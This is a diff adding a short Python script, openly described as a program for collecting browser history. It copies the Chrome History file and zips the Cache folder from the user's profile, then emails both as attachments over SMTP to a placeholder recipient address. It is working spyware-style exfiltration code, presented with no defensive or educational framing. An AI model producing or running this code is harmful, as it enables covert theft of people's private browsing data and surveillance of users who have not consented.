@@ -1,0 +1,52 @@
+#Program for collecting browser history
+
+import smtplib
+import os
+import shutil
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+# Function to send email
+def send_email(file_path, recipient_email):
+    sender_email = "your_email@example.com"
+    sender_password = "your_password"
+
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = recipient_email
+    msg['Subject'] = "Browser History and Cache"
+
+    attachment = MIMEBase('application', 'octet-stream')
+    with open(file_path, 'rb') as file:
+        attachment.set_payload(file.read())
+    encoders.encode_base64(attachment)
+    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_path)}')
+    msg.attach(attachment)
+
+    with smtplib.SMTP('smtp.example.com', 587) as server:
+        server.starttls()
+        server.login(sender_email, sender_password)
+        server.send_message(msg)
+
+# Function to copy browser history and cache
+def copy_browser_data():
+    browser_data_path = os.path.expanduser("~/.config/google-chrome/Default/")  # Example for Chrome
+    history_file = os.path.join(browser_data_path, "History")
+    cache_folder = os.path.join(browser_data_path, "Cache")
+
+    # Copy history file
+    shutil.copy(history_file, "History_Copy")
+
+    # Copy cache folder
+    shutil.make_archive("Cache_Copy", 'zip', cache_folder)
+
+    return ["History_Copy", "Cache_Copy.zip"]
+
+# Main execution
+if __name__ == "__main__":
+    recipient_email = "recipient@example.com"
+    files_to_send = copy_browser_data()
+    
+    for file in files_to_send:
+        send_email(file, recipient_email)
